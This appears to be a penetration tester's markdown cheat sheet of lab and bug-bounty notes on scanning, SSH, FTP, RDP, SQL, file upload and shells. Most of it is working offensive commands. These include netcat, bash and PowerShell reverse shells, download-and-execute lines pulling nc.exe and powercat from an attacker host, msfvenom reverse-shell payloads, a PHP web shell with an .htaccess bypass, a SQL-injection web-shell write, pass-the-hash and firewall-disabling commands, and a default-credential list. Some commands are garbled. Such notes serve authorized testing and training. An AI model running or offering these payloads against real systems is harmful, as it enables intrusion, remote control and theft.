# Useful tips

## Index

- [Glossary](#glossary)
- [Client-specific key areas of concern](#client-specific-key-areas-of-concern)
- [General notes](#general-notes)
- [PT initial foothold](#pt-initial-foothold)
- [SSH notes](#ssh-notes)
- [FTP notes](#ftp-notes)
- [Git commands / shell](#git-commands-shell)
- [Remote Desktop](#remote-desktop)
- [SQL connections](#sql-connections)
- [Reverse engineering](#reverse-engineering)
- [File upload](#file-upload)
- [Shells](#shells)

## Glossary

- [Session hijacking](https://owasp.org/www-community/attacks/Session_hijacking_attack)
- [Session fixation](https://owasp.org/www-community/attacks/Session_fixation)
- [OSI Model](https://en.wikipedia.org/wiki/OSI_model)

**Some terminology**
- IPS: Intrusion Protection System
- IDS: Intrusion Detection System
- CIA triangle: Confidentiality, Integrity, Availability
- HIDS: Host Intrusion Detection System
- NIDS: Network Intrusion Detection System

**Shells**
- Shell: we open a shell on the client
- Reverse shell: we make the victim connect to us with a shell
  - Attacker: `nc -lvp 4444`
  - Victim: `nc <ip_attacker> 4444 -e /bin/sh`
- Bind shell: the victim has a listener running and the attacker connects to it in order to get a shell
  - Attacker: `nc <ip_victim> 4444`
  - Victim: `nc -lvp 4444 -e /bin/sh`

**Payloads**
- Staged: Sends payload in stages, can be less stable
  - example: `windows/meterpreter/reverse_tcp`
- Non-staged: Sends exploit all at once, larger in size and won't always work
  - example: `windows/meterpreter_reverse_tcp`

**Active directory**
There can be multiple domains. This is called a tree, a parent domain and other child domains. With many trees you start to have a forest. Inside are the Organization Unites, objects.

Trust:
- Directional: one domain trust one domain
- Transactional: one domain trusts one domain and everything that it trusts

SYSVOL is a folder that exists on all domain controllers. It is a shared folder storing the Group Policy Objects (GPOs) and information along with any other domain related scripts. It is an essential component for Active Directory since it delivers these GPOs to all computers on the domain. Domain-joined computers can then read these GPOs and apply the applicable ones, making domain-wide configuration changes from a central location.

## Client-specific key areas of concern
- [HIPAA](https://www.hhs.gov/hipaa/for-professionals/security/laws-regulations/index.html), a framework that governs medical data in the US
- [PCI](https://www.pcisecuritystandards.org/), a framework that governs credit card and payment processing
- [GDPR](https://gdpr-info.eu/), a Regulation in EU law on data protection and privacy in the EU and the European Economic Area
  - Examples
    - ["Twitter fined ~$550K over a data breach in Ireland’s first major GDPR decision"](https://techcrunch.com/2020/12/15/twitter-fined-550k-over-a-data-breach-in-irelands-first-major-gdpr-decision/), [Tweet from Whitney Merrill](https://twitter.com/wbm312/status/1645497243708067841)
    - See also: [Increasing your bugs with the impact of the GDPR](https://www.youtube.com/watch?v=7JiOqXIZHy0)

## General notes

- For RCE 
  - Never upload a shell at first, you can be banned from a program. Just execute a `whoami` as a PoC, proceed with a shell if required/allowed.
- For stored XSS
  - `console.log()` is better than `alert()`, it makes less noise especially for stored XSS.
- For SQLi
  - Don't dump the entire db, you can be banned from a program. Just retrieve the db's name, version and/or other minor infos. Proceed with db dump only if required/allowed;
  - Don't use tautologies like `OR 1=1`, it can end up in a delete query or something dangerous. It's better to use `AND SLEEP(5)` or `te'+'st`.
- For subdomain takeovers
  - use as a PoC an html page like:<br/>
    9a69e2677c39cdae365b49beeac8e059.html
    ```HTML
    <!-- PoC by seeu -->
    ```
- For Metasploit: the port `4444` is very common with Metasploit, so this can trigger some warnings. Consider using another port if the exploit doesn't work.

Default Credentials
- admin:admin
- administrator:administrator
- admin:password
- admin:secret
- root:root
- root:password
- ftp:ftp
- Anonymous:_blank
- username:username
- guest:_blank
- guest:guest
- admin:servicename
- tomcat:s3cret
- firstname:surname


## PT initial foothold

**Light way scan**
1. `ports=$(nmap -p- --min-rate=1000 -T4 192.168.134.126 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`
2. `echo $ports`
3. `nmap -p$ports -sC -sV 192.168.134.126 -oN nmap_results`
   - `sU` for UDP, `sT` for TCP

**More scans**
- `nmap -T4 -p- --min-rate=1000 -sV -sC -vvv -oN nmap_results 192.168.134.114 -Pn`
- `for i in {1..65535}; do (echo > /dev/tcp/172.17.0.1/$i) >/dev/null 2>&1 && echo $i is open; done`
- `dig @192.168.212.165 AXFR heist.offsec`
- `dnsenum 192.168.212.165`
- `autorecon 192.168.228.109`
- `rustscan --ulimit 5000 192.168.220.131`
- `nikto -host=http://www.targetcorp.com -maxtime=30s`

**Fast way**
1. `masscan -p1-65535 10.10.10.93 --rate=1000 -e tun0 > ports`
2. `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
3. `nmap -Pn -sV -sC -p$ports 10.10.10.93`

**Checklist**
- Top 100 ports: `TCP(100;7,9,13,21-23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000-6001,6646,7070,8000,8008-8009,8080-8081,8443,8888,9100,9999-10000,32768,49152-49157)`
- Check always the source code for comments and secrets
  - maybe a functionality has been disabled and can be renabled
  - maybe you can find secrets

**If you find an unkwon service, try again this command**
- `sudo nmap -sC -sV -p PORTNUMBER -sU 10.10.10.116`

**Other ways**
- `for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done`
- `for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`

## SSH notes

- `scp username@remoteHost:/remote/dir/file.txt /local/dir/`
  - `scp Administrator@10.10.210.84:"/C:/Users/Administrator/Downloads/20230824142942_loot.zip" "/home/kali/Documents/engagements/TryHackMe/Post-Exploitation Basics/loot.zip"`
- `pscp.exe username@remoteHost:/remote/dir/file.txt d:\`

**ssh exploitation**
- `scp -O /home/kali/Documents/engagements/proving-grounds/Sorcerer/max/authorized_keys max@192.168.240.100:/home/max/.ssh/authorized_keys`
  - `mv /home/kali/Documents/engagements/proving-grounds/Sorcerer/max/ /home/kali/.ssh/id_rsa`
  - https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/sorcerer

**Create ssh keys**
- `sudo ssh-keygen`
- `sudo cp /root/.ssh/id_rsa.pub authorized_keys`
- `cd /home/benoit/.ssh`
- `put authorized_keys`
- `sudo ssh benoit@192.168.218.233 -i /root/.ssh/id_rsa`

## FTP notes

- `ftp -p IP 1221`
  - `force passive mode`
- `put FILE`
- `get FILE`
- try default creds (`ftp:ftp`, `anonymous:`, etc.)
- Consider that your uploads might end up in the directory `/var/ftp`
- Try `binary` for binary mode if the ftp is not working well


## Git commands / shell

- Basic git process
  - `git clone <source>`
  - `git add -A`
  - `git commit -m "comment"`
  - `git push origin master`
- When access to git shell
  - `GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@IP:/git-server`
  - `GIT_SSH_COMMAND='ssh -i /home/kali/Documents/engagements/proving-grounds/Hunit/id_rsa -p 43022' git push origin master`
- GitTools
  1. `./gitdumper.sh http://IP/.git/ git-repo-dir`
  2. `git checkout -- .`


## Remote Desktop

- `xfreerdp /u:username /p:password /cert:ignore /v:IP`
- `xfreerdp /u:username /p:password /d:domain.com /v:IP`
- `rdesktop -u username -p password IP`
- `remmina`
- ```PowerShell
  # enable RDP
  Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

  # enable RDP pass the hash
  New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" PropertyType DWORD -Force

  # enable RDP and add user
  reg add "HEY_LOCAL _MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" / fDenyTSConnections /t REG_DWORD /d 0 /f
  reg add HKLM\System \CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f netsh advfirewall set allprofiles state off
  net localgroup "remote desktop users" <USER. NAME> / add
  ```

## SQL connections

- `mysql --host=localhost --user=proftpd --password=protfpd_with_MYSQL_password`
- `psql -h IP -p 5432 -U root -W`
- `mssqlclient.py -p 1435 username:password@IP`
  - `xp_cmdshell whoami /all`
  - `xp_cmdshell copy \\ATTACKERIP\nc\nc.exe c:\Users\Public\nc.exe`
- `impacket-mssqlclient username:'password'@127.0.0.1 -windows-auth`

**SQLite3**
- If you have found a db, you can open it manually or with `sqlite3 Audit.db`
- Second option, commands: `.tables`, `selecet * fom tableOfUsers;`

**MongoDB**
- `mongo --host IP:PORT`
- `mongo <database> -u <username> -p '<password>'`
- `nmap -n -sV --script mongodb-brute -p 27017 IP`
- `show dbs`
- `use dbname`
- `db.users.find()`
- https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb


## Reverse engineering

- [DNSpy](https://github.com/dnSpy/dnSpy), .NET debugger
- [Rider](https://www.jetbrains.com/rider/download/#section=windows)
- [See hardcoded secrets](#hardcoded-secrets)
- `wine /home/kali/Documents/dnSpy/dnSpy.exe`
- Remove '\r' carriage return:
  `tr -d '\r' < inputfile.txt > outputfile.txt && mv outputfile.txt inputfile.txt`
  - The major minor symbols must be kept
  - alternative: `dos2unix 46527.sh`


**Brainfuck**
- Brainfuck example: `++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.`
- Deobfuscator: https://www.splitbrain.org/_static/ook/


## File upload

- for gifs: `GIF87a;` or `GIF89a;`
- remember that if you can do an arbitrary upload, then try to view the files with an LFI with `zip://`, `php://` or other wrappers

**cURL**
- `curl -X POST -F "file=@/path/to/your/file" http://example.com/postinfo.html`
- `curl -X PUT --upload-file exploit.html http://example.com/exploit.html`
- `curl -X MOVE --header 'Destination:http://example.com/exploit.asp' 'http://exploit.com/exploit.html`

## Shells

**Web shells**
- In kali, `cd /usr/share/webshells/`
  - `asp`, `aspx`, `cfm`, `jsp`, `laudanum`, `perl`, `php`, `phtml`
- `cp /usr/share/webshells/php/php-reverse-shell.php .`
- `cp /home/kali/Documents/windows-attack/Scripts/windows-php-reverse-shell.php .`
- for gifs: `GIF87a;` or `GIF89a;`
- https://github.com/Dhayalanb/windows-php-reverse-shell/tree/master
- `.htaccess`: https://github.com/wireghoul/htshells
  - Another trick from OSCP Walkthroughs
    - ```
      .htaccess
      AddType application/x-httpd-php .evil
      (+)
      siren.evil
      <pre><?php echo system($_GET['cmd']); ?></pre>
      ```
- for asp applications
  - `cp /usr/share/webshells/aspx/cmdasp.aspx .`
  - `cp /usr/share/laudanum/aspx/shell.aspx .`
  - `wget https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp -O cmd.asp`
  - try `.aspx` or `.mspx` to upload a cmd shell
  - another try:
    1. https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc   (+)
    2. https://github.com/autofac/Examples/blob/master/src/WebFormsExample/Site.Master.cs
    - See "Proving Grounds: Butch" https://auspisec.com/blog/20220118/proving_grounds_butch_walkthrough.html
  - `web.config` to run as an ASP: https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/
  - `cp /usr/share/webshells/config/web.config .`


**Reverse shells**
- `mknod a p && telnet IP 443 0<a | /bin/sh 1>a`
- `certutil.exe -urlcache -split -f http://IP/nc.exe nc.exe`
  - `.\\\\nc.exe IP 443 -e cmd.exe`
- `\\IP\Share\nc.exe IP 443 -e cmd.exe`
- `bash -i >& /dev/tcp/IP/80 0>&1`
- `nc -nv IP 80 -e /bin/bash`
- Notes
  - https://www.revshells.com/
  - https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/
  - Windows Reverse Shell Generator — https://github.com/thosearetheguise/rev
  - For the listener, use `rlwrap`


**Windows Reverse Shell**
1. `sudo impacket-smbserver -smb2support share /home/kali/Documents/windows-attack/nc/`
2. `cmd.exe /c //IP/Share/nc.exe -e cmd.exe IP 7680`
- Fix PATH: `set PATH=%SystemRoot%\system32;%SystemRoot%;`


**Powershell Reverse Shell**
- `powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://IP/powercat.ps1');powercat -c IP -p 5040 -e powershell"`
- `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('IP',21);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
- `powershell -e <BASE64>`
  - `python ps_encoder.py -s powershell_reverse_shell.ps1`
  - `python ps_encoder.py -s powershell_reverse_shell_2.ps1`


**Upgrade shell**
1. `python -c 'import pty;pty.spawn("/bin/bash")'`
   - `python3 -c 'import pty;pty.spawn("/bin/bash")'`
   - `perl -e 'exec "/bin/bash";'`
   - `/usr/bin/script -qc /bin/bash /dev/null`
2. `CTRL^Z`
3. `stty raw -echo;fg`
4. `reset`
5. `xterm-256color`
If something goes wrong
- `export TERM=xterm-256color`
- `stty rows 56 columns 213`
- `export PATH="/bin:/sbin:/usr/bin:/usr/sbin:$PATH"`
- `export SHELL=/bin/bash`


**msfvenom shells**
- `msfvenom -p linux/x64/exec -f elf-so PrependSetuid=true | base64`
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8444 EXITFUNC=thread -f exe -o shell.exe`
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=445 -f exe -e 64/xor -o shell.exe`
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.163 LPORT=445 -f exe -o shell.exe`
- `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.163 LPORT=445 -f exe -o shell.exe`
- `msfvenom -f psh-cmd -p windows/shell_reverse_tc LHOST=tun0 LPORT=8443 -o rev.ps1`
- `msfvenom -f ps1 -p windows/shell_reverse_tcp LHOST=tun0 LPORT=8443 -o rev.ps1`
- `msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f msi > shell.msi`
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8444 -f aspx > devel.aspx`
  - run with: `msiexec /quiet /qn /i shell.msi`
- `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.231 LPORT=4242 -f elf > reverse.elf`
- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.30 LPORT=4445 -f war > shell.war`
  - for file uploads in tomcat/manager
  - `setoolkit > 1 > 9 > 1`
- Resources
  - https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
  - https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/

**Access shell**
- `impacket-wmiexec domain.local/username@IP`
- `impacket-wmiexec domain.local/username@IP -hashes :HASH`
- `evil-winrm -u 'username' -p '*******' -i IP -N`
- `evil-winrm -i IP -u username -p password`
- `evil-winrm -u username -H ':HASH' -i IP -N`
- `crackmapexec smb IP -u username -p "password"`
- `impacket-psexec username:password@IP`
  - `msf> use exploit/windows/smb/psexec`
  - https://0xdf.gitlab.io/2020/01/26/digging-into-psexec-with-htb-nest.html

**Save files**
- `echo "<?php system('chmod +x /usr/bin/find; chmod +s /usr/bin/find');?>" >index.php`
- `' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -'`
- `curl -T my-shell.php -u 'administrant:sleepless' http://muddy.ugc/webdav/`
